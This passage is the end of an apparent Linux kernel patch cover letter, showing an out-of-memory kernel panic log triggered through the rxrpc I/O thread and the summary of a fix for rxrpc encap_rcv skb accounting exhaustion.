[   82.090697][ T4954] rpc_tasks                  8KB         11KB
[   82.090704][ T4954] UNIX-STREAM               42KB        127KB
[   82.090711][ T4954] UNIX                      53KB        127KB
[   82.090719][ T4954] tcp_bind2_bucket          14KB         16KB
[   82.090726][ T4954] tcp_bind_bucket           15KB         16KB
[   82.090733][ T4954] ip_fib_trie                3KB          4KB
[   82.090741][ T4954] ip_fib_alias               5KB          7KB
[   82.090748][ T4954] rtable                    11KB         16KB
[   82.090754][ T4954] RAW                       22KB         31KB
[   82.090761][ T4954] UDP                       17KB         63KB
[   82.090767][ T4954] request_sock_TCP           5KB         15KB
[   82.090774][ T4954] TCP                       68KB         87KB
[   82.090780][ T4954] fs_bio_integrity           7KB          8KB
[   82.090789][ T4954] hugetlbfs_inode_cache         14KB         15KB
[   82.090796][ T4954] netfs_subrequest          35KB         37KB
[   82.090804][ T4954] netfs_request            105KB        111KB
[   82.090811][ T4954] bio-288                   31KB         31KB
[   82.090817][ T4954] bio-328                   12KB         15KB
[   82.090824][ T4954] ep_head                    4KB         15KB
[   82.090831][ T4954] eventpoll_pwq              8KB         19KB
[   82.090838][ T4954] eventpoll_epi             22KB         51KB
[   82.090845][ T4954] inotify_inode_mark         36KB         39KB
[   82.090852][ T4954] bpf_fs_inode_cache         14KB         15KB
[   82.090860][ T4954] sgpool-128               140KB        148KB
[   82.090866][ T4954] sgpool-64                 80KB         95KB
[   82.090874][ T4954] sgpool-32                 40KB         47KB
[   82.090881][ T4954] sgpool-16                 17KB         45KB
[   82.090887][ T4954] sgpool-8                  22KB         22KB
[   82.090894][ T4954] bio_crypt_ctx              9KB         11KB
[   82.090902][ T4954] bio_integrity_data          7KB          8KB
[   82.090908][ T4954] request_queue            195KB        211KB
[   82.090915][ T4954] blkdev_ioc                12KB         19KB
[   82.090922][ T4954] bio-200                   68KB         71KB
[   82.090941][ T4954] biovec-max               454KB        535KB
[   82.090948][ T4954] biovec-128                31KB         63KB
[   82.090955][ T4954] biovec-64                 60KB         63KB
[   82.090961][ T4954] biovec-16                 20KB         22KB
[   82.090970][ T4954] uid_cache                 13KB         18KB
[   82.090977][ T4954] dmaengine-unmap-256         26KB         30KB
[   82.090984][ T4954] dmaengine-unmap-128         14KB         15KB
[   82.091074][ T4954] dmaengine-unmap-16          7KB          8KB
[   82.091082][ T4954] dmaengine-unmap-2          3KB          4KB
[   82.091088][ T4954] QIPCRTR                   18KB         31KB
[   82.091095][ T4954] audit_buffer               9KB         23KB
[   82.091101][ T4954] skbuff_small_head     583145KB     583145KB
[   82.091109][ T4954] skbuff_fclone_cache         18KB         45KB
[   82.091115][ T4954] skbuff_head_cache     224273KB     224276KB
[   82.091122][ T4954] configfs_dir_cache         15KB         16KB
[   82.091130][ T4954] file_lock_cache            7KB         19KB
[   82.091136][ T4954] file_lock_ctx             19KB         23KB
[   82.091143][ T4954] fsnotify_inode_mark_connector         32KB         35KB
[   82.091151][ T4954] taskstats                 44KB         47KB
[   82.091157][ T4954] mem_cgroup_per_node        122KB        153KB
[   82.091164][ T4954] mem_cgroup               140KB        150KB
[   82.091172][ T4954] proc_dir_entry           277KB        300KB
[   82.091178][ T4954] pde_opener                 3KB          3KB
[   82.091193][ T4954] seq_file                   4KB         15KB
[   82.091200][ T4954] sigqueue                   4KB         15KB
[   82.091209][ T4954] shmem_inode_cache       8366KB       8485KB
[   82.091269][ T4954] kernfs_iattrs_cache        134KB        149KB
[   82.091288][ T4954] kernfs_node_cache      17766KB      18013KB
[   82.091296][ T4954] mnt_cache                 59KB         86KB
[   82.091312][ T4954] filp                     220KB        779KB
[   82.091319][ T4954] names_cache               10KB         28KB
[   82.091326][ T4954] net_namespace             38KB         58KB
[   82.091334][ T4954] ima_iint_cache           141KB        143KB
[   82.091340][ T4954] hashtab_node             274KB        274KB
[   82.091347][ T4954] ebitmap_node            1155KB       1169KB
[   82.091355][ T4954] avtab_node              4975KB       4976KB
[   82.091367][ T4954] avc_node                  58KB         91KB
[   82.091410][ T4954] lsm_inode_cache         4637KB       5797KB
[   82.091421][ T4954] lsm_file_cache            32KB        192KB
[   82.091427][ T4954] key_jar                   32KB         39KB
[   82.091433][ T4954] uts_namespace             22KB         30KB
[   82.091440][ T4954] nsproxy                   11KB         15KB
[   82.091471][ T4954] vm_area_struct           818KB       1481KB
[   82.091478][ T4954] fs_cache                  15KB         28KB
[   82.091485][ T4954] files_cache               59KB        127KB
[   82.091493][ T4954] task_exec_state            5KB         24KB
[   82.091504][ T4954] signal_cache             536KB       1571KB
[   82.091518][ T4954] sighand_cache            684KB       2014KB
[   82.091569][ T4954] task_struct             2421KB       4125KB
[   82.091583][ T4954] cred                      96KB        300KB
[   82.091595][ T4954] anon_vma_chain           199KB        378KB
[   82.091608][ T4954] anon_vma                 253KB        394KB
[   82.091619][ T4954] pid                      112KB        266KB
[   82.091628][ T4954] Acpi-Operand              53KB        110KB
[   82.091648][ T4954] Acpi-ParseExt             14KB         31KB
[   82.091655][ T4954] Acpi-Parse                 9KB         31KB
[   82.091842][ T4954] Acpi-State                12KB         27KB
[   82.091849][ T4954] Acpi-Namespace            28KB         32KB
[   82.091856][ T4954] numa_policy                3KB          4KB
[   82.091862][ T4954] perf_event                15KB         31KB
[   82.091869][ T4954] trace_event_file         547KB        548KB
[   82.091876][ T4954] ftrace_event_field       1057KB       1059KB
[   82.091883][ T4954] pool_workqueue           528KB        528KB
[   82.091906][ T4954] maple_node               502KB       1616KB
[   82.091914][ T4954] mm_struct                 92KB        478KB
[   82.091930][ T4954] vmap_area                403KB        542KB
[   82.091936][ T4954] debug_objects_cache       2163KB       2167KB
[   82.091945][ T4954] page->ptl                 36KB        122KB
[   82.091952][ T4954] kmalloc-cg-8k            160KB        160KB
[   82.091959][ T4954] kmalloc-cg-4k            792KB       1056KB
[   82.091968][ T4954] kmalloc-cg-2k           1060KB       1216KB
[   82.091976][ T4954] kmalloc-cg-1k            180KB        320KB
[   82.091983][ T4954] kmalloc-cg-512            88KB        192KB
[   82.091990][ T4954] kmalloc-cg-256            75KB         88KB
[   82.091997][ T4954] kmalloc-cg-128          1039KB       1052KB
[   82.092008][ T4954] kmalloc-cg-64             50KB        220KB
[   82.092017][ T4954] kmalloc-cg-32            423KB        448KB
[   82.092024][ T4954] kmalloc-cg-16              3KB          8KB
[   82.092030][ T4954] kmalloc-cg-8               3KB          8KB
[   82.092036][ T4954] kmalloc-cg-192            20KB         24KB
[   82.092044][ T4954] kmalloc-cg-96            350KB        372KB
[   82.092055][ T4954] kmalloc-8k              1632KB       1792KB
[   82.092098][ T4954] kmalloc-4k              2768KB       6944KB
[   82.092105][ T4954] kmalloc-2k             10004KB      10016KB
[   82.092113][ T4954] kmalloc-1k              3240KB       3328KB
[   82.092128][ T4954] kmalloc-512             5370KB       5984KB
[   82.092138][ T4954] kmalloc-256             3348KB       3456KB
[   82.092157][ T4954] kmalloc-128              884KB       1068KB
[   82.092206][ T4954] kmalloc-64              3017KB       3252KB
[   82.092387][ T4954] kmalloc-32               446KB       1092KB
[   82.092398][ T4954] kmalloc-16               518KB        532KB
[   82.092407][ T4954] kmalloc-8                377KB        400KB
[   82.092424][ T4954] kmalloc-192              699KB        852KB
[   82.092441][ T4954] kmalloc-96              1234KB       1328KB
[   82.092447][ T4954] kmem_cache_node          108KB        110KB
[   82.092454][ T4954] kmem_cache               180KB        180KB
[   82.092464][ T4954] Memory cgroup min protection 0kB -- low protection 0kB
[   82.092469][ T4954] Tasks state (memory values in pages):
[   82.092472][ T4954] [  pid  ]   uid  tgid total_vm      rss rss_anon rss_file rss_shmem pgtables_bytes swapents oom_score_adj name
[   82.092708][ T4954] [   4992]     0  4992     8006      232      229        2         1    86016        0          -250 systemd-journal
[   82.092746][ T4954] [   5002]     0  5002     9185     2796     2794        2         0    94208        0         -1000 systemd-udevd
[   82.092766][ T4954] [   8850]     0  8850    55235      328      326        2         0    86016        0             0 rsyslogd
[   82.092801][ T4954] [   9195]     0  9195    24973      356      354        2         0    73728        0             0 dhclient
[   82.092821][ T4954] [   9245]     0  9245      720       34       32        2         0    40960        0             0 agetty
[   82.092840][ T4954] [   9246]     0  9246      720       35       33        2         0    49152        0             0 agetty
[   82.092996][ T4954] [   9247]     0  9247      720       34       32        2         0    45056        0             0 agetty
[   82.093030][ T4954] [   9248]     0  9248      720       33       31        2         0    49152        0             0 agetty
[   82.093056][ T4954] [   9249]     0  9249      720       34       32        2         0    53248        0             0 agetty
[   82.093081][ T4954] [   9250]     0  9250      720       35       33        2         0    53248        0             0 agetty
[   82.093107][ T4954] [   9251]     0  9251     1101       36       34        2         0    45056        0             0 agetty
[   82.093132][ T4954] [   9252]     0  9252     3340      245      243        2         0    69632        0         -1000 sshd
[   82.093158][ T4954] [   9254]     0  9254    14097      390      389        1         0    90112        0             0 nginx
[   82.093263][ T4954] [   9255]    33  9255    14191      471      469        2         0    90112        0             0 nginx
[   82.093388][ T4954] [   9256]    33  9256    14191      471      469        2         0    90112        0             0 nginx
[   82.093456][ T4954] [   9964]     0  9964     1429      143       63       80         0    53248        0             0 bash
[   82.093478][ T4954] [   9967]     0  9967     3453      292      290        2         0    65536        0             0 sshd
[   82.093497][ T4954] [   9973]  1001  9973     3453      292      290        2         0    65536        0             0 sshd
[   82.093517][ T4954] [   9974]  1001  9974   246315       63       62        1         0   110592        0             0 poc_rxrpc_mem

[   82.093564][ T4954] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
[   82.439197][ T4954] CPU: 1 UID: 0 PID: 4954 Comm: krxrpcio/7001 Not tainted 7.3.0-rc1+ #2 PREEMPT(full) 
[   82.440847][ T4954] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   82.442753][ T4954] Call Trace:
[   82.443408][ T4954]  <TASK>
[   82.443899][ T4954]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
[   82.444682][ T4954]  dump_stack (lib/dump_stack.c:129)
[   82.445350][ T4954]  vpanic (kernel/panic.c:651)
[   82.446027][ T4954]  ? __pfx_vpanic (kernel/panic.c:363)
[   82.446770][ T4954]  panic (kernel/panic.c:788)
[   82.447382][ T4954]  ? __pfx_panic (kernel/panic.c:741)
[   82.448107][ T4954]  ? dump_header (mm/oom_kill.c:475)
[   82.448924][ T4954]  out_of_memory (mm/oom_kill.c:1076 (discriminator 4) mm/oom_kill.c:1143)
[   82.449697][ T4954]  ? __pfx_out_of_memory (mm/oom_kill.c:835)
[   82.450608][ T4954]  __alloc_frozen_pages_noprof (mm/page_alloc.c:4113 mm/page_alloc.c:5030 mm/page_alloc.c:5449)
[   82.451565][ T4954]  ? __pfx_stack_trace_consume_entry+0x10/0x10
[   82.452575][ T4954]  ? __pfx___alloc_frozen_pages_noprof (mm/page_alloc.c:4022)
[   82.453600][ T4954]  ? stack_trace_save (kernel/stacktrace.c:122 (discriminator 1))
[   82.454408][ T4954]  ? __pfx_stack_trace_save (kernel/stacktrace.c:397)
[   82.455268][ T4954]  ? __kasan_check_write (mm/kasan/shadow.c:37 (discriminator 1))
[   82.456263][ T4954]  ? _raw_spin_unlock_irqrestore (include/linux/spinlock_api_smp.h:210 (discriminator 1) kernel/locking/spinlock.c:221)
[   82.457325][ T4954]  ? __refill_objects_node (include/linux/list.h:140 include/linux/list.h:261 include/linux/list.h:275 mm/slub.c:7276)
[   82.458191][ T4954]  allocate_slab (mm/slub.c:3347 (discriminator 2) mm/slub.c:3470)
[   82.458949][ T4954]  new_slab (mm/slub.c:3513)
[   82.459599][ T4954]  refill_objects (mm/slub.c:7410)
[   82.460340][ T4954]  ? __pcs_replace_empty_main (include/linux/local_lock_internal.h:62 (discriminator 1) mm/slub.c:4762)
[   82.461381][ T4954]  __pcs_replace_empty_main (mm/slub.c:2885 mm/slub.c:4774)
[   82.462654][ T4954]  kmem_cache_alloc_node_noprof (mm/slub.c:4850 mm/slub.c:4984 mm/slub.c:5068)
[   82.463575][ T4954]  ? kmalloc_reserve (net/core/skbuff.c:615 (discriminator 2))
[   82.464403][ T4954]  kmalloc_reserve (net/core/skbuff.c:615 (discriminator 2))
[   82.465191][ T4954]  __alloc_skb (net/core/skbuff.c:715)
[   82.465972][ T4954]  ? __alloc_skb (include/linux/bottom_half.h:20 (discriminator 1) net/core/skbuff.c:697)
[   82.466922][ T4954]  ? __pfx___alloc_skb (include/linux/fortify-string.h:447)
[   82.467855][ T4954]  alloc_skb_with_frags (include/linux/skbuff.h:1384 net/core/skbuff.c:6796)
[   82.468672][ T4954]  ? __local_bh_enable_ip (kernel/softirq.c:478)
[   82.469529][ T4954]  ? __sanitizer_cov_trace_switch (kernel/kcov.c:347 (discriminator 1))
[   82.470490][ T4954]  sock_alloc_send_pskb (net/core/sock.c:3015)
[   82.471436][ T4954]  ? find_held_lock (kernel/locking/lockdep.c:5367)
[   82.472168][ T4954]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[   82.473023][ T4954]  ? __pfx_sock_alloc_send_pskb (net/core/sock.c:2847 (discriminator 2))
[   82.473918][ T4954]  ? __lock_acquire (kernel/locking/lockdep.c:4690 kernel/locking/lockdep.c:5208)
[   82.474904][ T4954]  ? ipv6_dev_get_saddr (include/linux/rcupdate.h:882 net/ipv6/addrconf.c:1916)
[   82.475738][ T4954]  ? __lock_acquire (kernel/locking/lockdep.c:4690 kernel/locking/lockdep.c:5208)
[   82.476539][ T4954]  __ip6_append_data (include/net/sock.h:1907 net/ipv6/ip6_output.c:1695)
[   82.477359][ T4954]  ? find_held_lock (kernel/locking/lockdep.c:5367)
[   82.478128][ T4954]  ? __pfx_ip_generic_getfrag (include/linux/skbuff.h:3160)
[   82.479126][ T4954]  ? __pfx___ip6_append_data (net/ipv6/ip6_output.c:2063)
[   82.480406][ T4954]  ? ip6_mtu (net/ipv6/route.c:3290)
[   82.481151][ T4954]  ? ip6_setup_cork (net/ipv6/ip6_output.c:1450)
[   82.482001][ T4954]  ip6_make_skb (net/ipv6/ip6_output.c:2094)
[   82.482943][ T4954]  ? __pfx_ip_generic_getfrag (include/linux/skbuff.h:3160)
[   82.483955][ T4954]  ? __pfx_ip6_make_skb (net/ipv6/ip6_output.c:2040)
[   82.485312][ T4954]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[   82.486222][ T4954]  udpv6_sendmsg (net/ipv6/udp.c:1720)
[   82.487098][ T4954]  ? udpv6_sendmsg (net/ipv6/udp.c:1720)
[   82.487903][ T4954]  ? __pfx_udpv6_sendmsg (net/ipv6/udp.c:338)
[   82.488827][ T4954]  ? ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
[   82.489708][ T4954]  ? stack_trace_save (kernel/stacktrace.c:122 (discriminator 1))
[   82.490773][ T4954]  ? __lock_acquire (kernel/locking/lockdep.c:4690 kernel/locking/lockdep.c:5208)
[   82.491684][ T4954]  ? kasan_save_stack (mm/kasan/common.c:58)
[   82.492495][ T4954]  ? kasan_save_stack (mm/kasan/common.c:57)
[   82.493363][ T4954]  ? debug_smp_processor_id (lib/smp_processor_id.c:58)
[   82.494336][ T4954]  ? rcu_is_watching (include/linux/context_tracking.h:128 (discriminator 1) kernel/rcu/tree.c:753)
[   82.495181][ T4954]  ? __sanitizer_cov_trace_const_cmp1 (kernel/kcov.c:296)
[   82.496373][ T4954]  ? __sanitizer_cov_trace_switch (kernel/kcov.c:347 (discriminator 1))
[   82.497344][ T4954]  rxrpc_reject_packet (net/rxrpc/output.c:30 net/rxrpc/output.c:863)
[   82.498291][ T4954]  ? rxrpc_reject_packet (net/rxrpc/output.c:30 net/rxrpc/output.c:863)
[   82.499373][ T4954]  ? __pfx_rxrpc_reject_packet (net/rxrpc/output.c:801)
[   82.500326][ T4954]  ? __kasan_check_write (mm/kasan/shadow.c:37 (discriminator 1))
[   82.501184][ T4954]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[   82.502191][ T4954]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4488)
[   82.503149][ T4954]  ? debug_smp_processor_id (lib/smp_processor_id.c:58)
[   82.504089][ T4954]  ? rxrpc_put_peer (net/rxrpc/peer_object.c:447)
[   82.505118][ T4954]  rxrpc_io_thread (net/rxrpc/io_thread.c:478)
[   82.506237][ T4954]  ? __pfx_rxrpc_io_thread (net/rxrpc/io_thread.c:108)
[   82.507287][ T4954]  ? kthread_affine_node (kernel/kthread.c:375)
[   82.508169][ T4954]  ? __lock_acquire (kernel/locking/lockdep.c:4690 kernel/locking/lockdep.c:5208)
[   82.509041][ T4954]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[   82.509961][ T4954]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4488)
[   82.510849][ T4954]  ? __pfx_rxrpc_io_thread (net/rxrpc/io_thread.c:108)
[   82.511922][ T4954]  kthread (drivers/block/aoe/aoecmd.c:1243)
[   82.512630][ T4954]  ? kthread (drivers/block/aoe/aoecmd.c:1243)
[   82.513476][ T4954]  ? __pfx_kthread (include/linux/list.h:175 (discriminator 2))
[   82.514354][ T4954]  ret_from_fork (arch/x86/kernel/process.c:158)
[   82.515410][ T4954]  ? __pfx_ret_from_fork (arch/x86/include/asm/desc.h:59 (discriminator 3))
[   82.516265][ T4954]  ? __sanitizer_cov_trace_const_cmp8 (kernel/kcov.c:317)
[   82.517355][ T4954]  ? __switch_to (arch/x86/kernel/process_64.c:713 (discriminator 1))
[   82.518196][ T4954]  ? __pfx_kthread (include/linux/list.h:175 (discriminator 2))
[   82.519073][ T4954]  ret_from_fork_asm (arch/x86/entry/entry_64.S:245)
[   82.519877][ T4954]  </TASK>
[   82.521689][ T4954] Kernel Offset: disabled
[   82.522550][ T4954] Rebooting in 86400 seconds..
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (1):
  rxrpc: fix encap_rcv skb accounting exhaustion

 net/rxrpc/io_thread.c    | 37 +++++++++++++++++++++++++++++++++++--
 net/rxrpc/local_object.c |  8 ++++++--
 2 files changed, 41 insertions(+), 4 deletions(-)

-- 
2.43.0

